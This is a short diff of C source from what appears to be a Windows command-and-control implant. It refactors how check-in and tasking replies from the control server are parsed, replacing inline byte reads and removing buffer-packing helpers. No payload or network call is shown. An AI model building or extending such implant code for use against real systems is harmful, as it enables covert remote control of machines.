@@ -11,38 +11,6 @@ WINBASEAPI char * MSVCRT$strstr(const char *str, const char *strSearch);
 
 /*
  *
- * HELPER FUNCTIONS
- *
-*/
-
-void pack_char(char *buf, int *offset, char paydata) {
-	buf[*offset] = paydata;
-	*offset += 1;
-}
-
-void pack_uint(char *buf, int *offset, unsigned int paydata) {
-	for (int i = 0; i < sizeof(unsigned int); i++) {
-		buf[*offset] = ((char *) &paydata)[i];
-		*offset += 1;
-	}
-}
-
-void pack_string(char *buf, int *offset, char *paydata) {
-	if (paydata != 0) {
-		int len = MSVCRT$strlen(paydata);
-		for (int i = 0; i < len; i++) {
-			buf[*offset] = paydata[i];
-			*offset += 1;
-		}
-	}
-	
-	// Add the null byte. If paydata is NULL, this results in a zero-length string.
-	buf[*offset] = 0;
-	*offset += 1;
-}
-
-/*
- *
  * CHECKIN LOGIC
  *
 */
@@ -87,8 +55,7 @@ void parse_checkin_reply(HttpResponse *response, CheckinReply *reply) {
 	
 	int offset = 0;
 	
-	reply->action = decoded_body[offset];
-	offset += 1;
+	reply->action = unpack_char(decoded_body, &offset);
 	
 	reply->callback_uuid = unpack_str(decoded_body, &offset);
 	reply->status = unpack_str(decoded_body, &offset);
@@ -177,11 +144,8 @@ void parse_tasking_reply(HttpResponse *response, TaskingReply *reply) {
 	
 	int offset = 0;
 	
-	reply->action = decoded_body[offset];
-	offset += 1;
-	
-	reply->tasking_size = decoded_body[offset];
-	offset += 1;
+	reply->action = unpack_char(decoded_body, &offset);	
+	reply->tasking_size = unpack_char(decoded_body, &offset);
 	
 	size_t task_len = reply->tasking_size * sizeof(TaskInfo);
 	reply->tasks = KERNEL32$VirtualAlloc(0, task_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
